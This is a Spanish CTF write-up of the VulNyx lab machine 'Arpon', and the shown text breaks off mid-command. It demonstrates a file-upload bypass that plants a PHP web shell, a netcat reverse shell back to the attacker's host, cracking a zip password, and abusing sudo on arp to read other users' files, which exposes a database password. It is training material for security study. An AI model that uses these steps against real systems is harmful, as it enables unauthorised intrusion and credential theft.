<!DOCTYPE html>
<html lang="es"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">VulNyx - Arpon | noname</title>
<meta property="og:title" content="VulNyx - Arpon | noname" />
<meta name="twitter:title" content="VulNyx - Arpon | noname" />
<meta itemprop="name" content="VulNyx - Arpon | noname" />
<meta name="application-name" content="VulNyx - Arpon | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup Arpon üü¢">
<meta itemprop="description" content="Writeup Arpon üü¢" />
<meta property="og:description" content="Writeup Arpon üü¢" />
<meta name="twitter:description" content="Writeup Arpon üü¢" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/nyx/arpon/" title="" />



  <meta itemprop="image" content="http://localhost:1313/images/logo.png" />
  <meta property="og:image" content="http://localhost:1313/images/logo.png" />
  <meta name="twitter:image" content="http://localhost:1313/images/logo.png" />
  <meta name="twitter:image:src" content="http://localhost:1313/images/logo.png" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-06-06T11:40:11&#43;0200 />
    <meta property="article:published_time" content=2024-06-06T11:40:11&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "VulNyx - Arpon",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-06-06",
        "description": "Writeup Arpon üü¢",
        "wordCount":  2285 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-06-06",
        "image": {
        "@type": "imageObject",
        "url": "\/images\/logo.png"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>

<meta name="generator" content="Hugo 0.140.0">

    

    <link rel="canonical" href="http://localhost:1313/writeups/nyx/arpon/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    </head>
<body data-theme = "" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">VulNyx - Arpon</h1>
                
                
                <div class="post-meta">
                    <time datetime="2024-06-06T11:40:11&#43;02:00" itemprop="datePublished"> Jun 6, 2024 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/nyx/arpon/arpon_logo.webp" alt="logo"></p>
<ul>
<li><em>File Upload - (Bypass Extension Check)</em></li>
<li><em>Brute Force Zip File - (JohnTheRipper/User Pivoting)</em></li>
<li><em>Abusing arp Binary - (id_rsa/User Pivoting 2)</em></li>
<li><em>Docker Group - (Privesc)</em></li>
</ul>
<h4 id="escaneo-de-puertos">Escaneo de puertos</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 172.0.100.28
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl 64
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl 64
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -sVC -p 22,80 172.0.100.28
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   256 e1:85:8b:7b:6d:a2:6b:1a:ed:18:8e:08:a0:90:87:2a (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 ad:fe:77:78:a0:57:70:cc:33:68:b5:84:26:a3:b3:63 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.59 ((Debian))
</span></span><span class="line"><span class="cl">|_http-title: Essex
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.59 (Debian)
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h3 id="http-tcp---80">HTTP TCP - 80</h3>
<p><img src="/../machines/nyx/arpon/http.webp" alt="http"></p>
<p>Realizo fuerza bruta de directorios</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ gobuster dir -u 172.0.100.28 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">[+] Url:                     http://172.0.100.28
</span></span><span class="line"><span class="cl">[+] Method:                  GET
</span></span><span class="line"><span class="cl">[+] Threads:                 10
</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">/backup               (Status: 301) [Size: 313] [--&gt; http://172.0.100.28/backup/]
</span></span><span class="line"><span class="cl">/imagenes             (Status: 301) [Size: 315] [--&gt; http://172.0.100.28/imagenes/]
</span></span></code></pre></div><p>En el directorio <strong>/backup</strong> hay una herramienta para subir archivos.</p>
<p><img src="/../machines/nyx/arpon/uploader.webp" alt="uploader"></p>
<p>Subo una imagen <strong>png</strong> y se sube correctamente.</p>
<p><img src="/../machines/nyx/arpon/uploadok.webp" alt="uploadok"></p>
<p>Realizo de nuevo fuerza bruta de directorios para buscar el directorio donde se suben las im√°genes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ gobuster dir -u 172.0.100.28/backup -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">[+] Url:                     http://172.0.100.28/backup
</span></span><span class="line"><span class="cl">[+] Method:                  GET
</span></span><span class="line"><span class="cl">[+] Threads:                 10
</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">/empty                (Status: 301) [Size: 319] [--&gt; http://172.0.100.28/backup/empty/]
</span></span><span class="line"><span class="cl">Progress: 175328 / 175330 (100.00%)
</span></span></code></pre></div><p>Ahora realizo fuerza bruta de extensiones <code>.png</code> en el directorio <strong>/empty</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ gobuster dir -u 172.0.100.28/backup/empty -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x png
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">[+] Url:                     http://172.0.100.28/backup/empty
</span></span><span class="line"><span class="cl">[+] Method:                  GET
</span></span><span class="line"><span class="cl">[+] Threads:                 10
</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl">[+] Extensions:              png
</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">/debian.png           (Status: 200) [Size: 25182]
</span></span></code></pre></div><p>Si intento subir un archivo <code>.php</code> me devuelve un error, as√≠ que abro <strong>BurpSuite</strong>, intercepto la petici√≥n, modifico el filename <code>debian.png</code> a <code>door.phar</code>, borro el contenido de la imagen y le inserto un c√≥digo malicioso en php.</p>
<p><img src="/../machines/nyx/arpon/burp.webp" alt="burp"></p>
<p>En el response veo que se ha subido correctamente ya que al ser una m√°quina f√°cil no filtra correctamente todas las extensiones.</p>
<p><img src="/../machines/nyx/arpon/response.webp" alt="response"></p>
<blockquote>
<p>En este <a href="https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology">enlace</a> tienes la metodolog√≠a b√°sica sobre <strong>file upload</strong>, se puede hacer de forma manual o autom√°tica usando el <strong>Intruder</strong> de Burpsuite, en este <a href="https://0x-noname.github.io/writeups/nyx/zone/">enlace</a> podr√°s ver como se hace. Yo lo he hecho manual porque ya he realizado m√°quinas similares.</p>
</blockquote>
<p>Con curl compruebo que puedo ejecutar comandos remotamente.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl -s &#34;172.0.100.28/backup/empty/door.phar?cmd=id&#34;
</span></span><span class="line"><span class="cl">PNG
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></div><p>Dejo un netcat a la escucha y me mando una shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl -s &#34;172.0.100.28/backup/empty/door.phar?cmd=nc%20-c%20/bin/bash%20172.0.100.25%201234&#34;
</span></span></code></pre></div><p>Obtengo la shell como usuario <strong>www-data</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nc -lvnp 1234
</span></span><span class="line"><span class="cl">listening on [any] 1234 ...
</span></span><span class="line"><span class="cl">connect to [172.0.100.25] from (UNKNOWN) [172.0.100.28] 33026
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></div><p>Una vez realizado el tratamiento para la <strong>TTY</strong> lanzo un <code>ls -la</code> y veo un directorio oculto con el nombre <strong>.hidden</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@arpon:/var/www/html/backup/empty$ ls -la
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">total 48
</span></span><span class="line"><span class="cl">drwxr-xr-x 3 www-data www-data  4096 Jun  4 12:33 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 3 www-data www-data  4096 May 12 22:58 ..
</span></span><span class="line"><span class="cl">drwxr-xr-x 2 www-data www-data  4096 May 13 23:31 .hidden
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 www-data www-data 25182 Jun  4 11:53 debian.png
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 www-data www-data    41 Jun  4 12:08 door.phar
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 www-data www-data     1 May 12 23:12 index.html
</span></span></code></pre></div><p>Dentro del directorio oculto contiene un archivo <strong>zip</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@arpon:/var/www/html/backup/empty/.hidden$ ls -la
</span></span><span class="line"><span class="cl">ls -la
</span></span><span class="line"><span class="cl">total 12
</span></span><span class="line"><span class="cl">drwxr-xr-x 2 www-data www-data 4096 May 13 23:31 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 3 www-data www-data 4096 Jun  4 12:33 ..
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 www-data www-data 3090 May 12 23:09 backup_id.zip
</span></span></code></pre></div><p>Si intento descomprimirlo en la m√°quina v√≠ctima me pide una contrase√±a que no tengo, pero parece que me proporciona un posible usuario con el nombre <strong>calabrote</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@arpon:/var/www/html/backup/empty/.hidden$ unzip backup_id.zip
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Archive:  backup_id.zip
</span></span><span class="line"><span class="cl">[backup_id.zip] id_rsa_calabrote password:
</span></span></code></pre></div><p>Creo un simple servidor <strong>HTTP</strong> con python para descargarme el archivo <strong>zip</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@arpon:/var/www/html/backup/empty/.hidden$ python3 -m http.server
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></code></pre></div><p>Lo descargo con wget.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ wget 172.0.100.28:8000/backup_id.zip
</span></span><span class="line"><span class="cl">--2024-06-04 12:48:31--  http://172.0.100.28:8000/backup_id.zip
</span></span><span class="line"><span class="cl">Connecting to 172.0.100.28:8000... connected.
</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
</span></span><span class="line"><span class="cl">Length: 3090 (3.0K) [application/zip]
</span></span><span class="line"><span class="cl">Saving to: ‚Äòbackup_id.zip‚Äô
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">backup_id.zip             100%[===================================&gt;]   3.02K  --.-KB/s    in 0s      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2024-06-04 12:48:31 (626 MB/s) - ‚Äòbackup_id.zip‚Äô saved [3090/3090]
</span></span></code></pre></div><p>Creo un hash del zip con <code>zip2john</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ zip2john backup_id.zip &gt; hash
</span></span></code></pre></div><p>Con john realizo fuerza bruta al archivo <strong>zip</strong> y encuentro su contrase√±a.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ john hash
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded 1 password hash (PKZIP [32/64])
</span></span><span class="line"><span class="cl">Will run 4 OpenMP threads
</span></span><span class="line"><span class="cl">Proceeding with single, rules:Single
</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span><span class="line"><span class="cl">Almost done: Processing the remaining buffered candidate passwords, if any.
</span></span><span class="line"><span class="cl">Proceeding with wordlist:/usr/share/john/password.lst
</span></span><span class="line"><span class="cl">s*******h        (backup_id.zip) 
</span></span></code></pre></div><p>Descomprimo el archivo y obtengo una llave <strong>RSA</strong> que pertence al usuario <strong>calabrote</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Archive:  backup_id.zip
</span></span><span class="line"><span class="cl">[backup_id.zip] id_rsa_calabrote password:  
</span></span><span class="line"><span class="cl">  inflating: id_rsa_calabrote        
</span></span><span class="line"><span class="cl">  inflating: id_rsa_calabrote.pub 
</span></span></code></pre></div><p>Doy permisos a la llave <strong>RSA</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ chmod 600 id_rsa_calabrote
</span></span></code></pre></div><p>Me conecto al sistema.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ssh calabrote@172.0.100.28 -i id_rsa_calabrote
</span></span><span class="line"><span class="cl">Linux arpon 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software;
</span></span><span class="line"><span class="cl">the exact distribution terms for each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class="line"><span class="cl">permitted by applicable law.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ bash -i
</span></span><span class="line"><span class="cl">calabrote@arpon:~$
</span></span></code></pre></div><p>Lanzo un <code>ls -la</code> al <strong>/home</strong> para enumerar usuarios del sistema.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">calabrote@arpon:~$ ls -la /home
</span></span><span class="line"><span class="cl">total 16
</span></span><span class="line"><span class="cl">drwxr-xr-x  4 root      root      4096 may 14 00:03 .
</span></span><span class="line"><span class="cl">drwxr-xr-x 18 root      root      4096 may 11 22:49 ..
</span></span><span class="line"><span class="cl">drwx------  3 calabrote calabrote 4096 jun  4 13:09 calabrote
</span></span><span class="line"><span class="cl">drwx------  5 foque     foque     4096 may 13 21:55 foque
</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">calabrote@arpon:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for calabrote on arpon:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User calabrote may run the following commands on arpon:
</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/sbin/arp
</span></span></code></pre></div><p>Busco informaci√≥n del binario <strong>arp</strong> en gtfobins.</p>
<p><img src="/../machines/nyx/arpon/gtfobins.webp" alt="gtfobins"></p>
<p>Leo el archivo <code>.bash_history</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">calabrote@arpon:~$ LFILE=/home/foque/.bash_history
</span></span><span class="line"><span class="cl">calabrote@arpon:~$ sudo /usr/sbin/arp -v -f &#34;$LFILE&#34;
</span></span><span class="line"><span class="cl">&gt;&gt; ls -lhF
</span></span><span class="line"><span class="cl">ls: No existe ninguna direcci√≥n asociada al nombre
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 1 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; cat script_net_backup.sh 
</span></span><span class="line"><span class="cl">cat: No existe ninguna direcci√≥n asociada al nombre
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 2 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; chmod 755 script_net_backup.sh 
</span></span><span class="line"><span class="cl">chmod: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 3 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; exit
</span></span><span class="line"><span class="cl">arp: format error on line 4 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; history 
</span></span><span class="line"><span class="cl">arp: format error on line 5 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; docker run hello-world
</span></span><span class="line"><span class="cl">docker: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 6 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; docker container run -it --rm alpine
</span></span><span class="line"><span class="cl">docker: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 7 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; docker container ps
</span></span><span class="line"><span class="cl">docker: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 8 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; docker container ps -a
</span></span><span class="line"><span class="cl">docker: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 9 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; docker container --help
</span></span><span class="line"><span class="cl">docker: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 10 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; docker container prune
</span></span><span class="line"><span class="cl">docker: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 11 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; docker container ps -a
</span></span><span class="line"><span class="cl">docker: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 12 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; docker images 
</span></span><span class="line"><span class="cl">docker: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 13 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; history 
</span></span><span class="line"><span class="cl">arp: format error on line 14 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; cat /etc/crontab 
</span></span><span class="line"><span class="cl">cat: No existe ninguna direcci√≥n asociada al nombre
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 15 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; top
</span></span><span class="line"><span class="cl">arp: format error on line 16 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; ip addr
</span></span><span class="line"><span class="cl">ip: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 17 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; mysql -uroot -pAbc123.. -h 10.1.1.1
</span></span><span class="line"><span class="cl">mysql: `Host&#39; desconocido
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 18 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; history 
</span></span><span class="line"><span class="cl">arp: format error on line 19 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; ss -lntp
</span></span><span class="line"><span class="cl">ss: No existe ninguna direcci√≥n asociada al nombre
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 20 of etherfile /home/foque/.bash_history !
</span></span><span class="line"><span class="cl">&gt;&gt; ls -lhF /var/www/html/
</span></span><span class="line"><span class="cl">ls: No existe ninguna direcci√≥n asociada al nombre
</span></span><span class="line"><span class="cl">arp: cannot set entry on line 21 of etherfile /home/foque/.bash_history !
</span></span></code></pre></div><p>En el <code>.bash_history</code> se aprecia que el usuario <strong>foque</strong> lanza un cat a <code>script_net_backup.sh</code> as√≠ que voy a leer ese archivo para ver de que se trata.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">calabrote@arpon:~$ LFILE=/home/foque/script_net_backup.sh
</span></span><span class="line"><span class="cl">calabrote@arpon:~$ sudo /usr/sbin/arp -v -f &#34;$LFILE&#34;
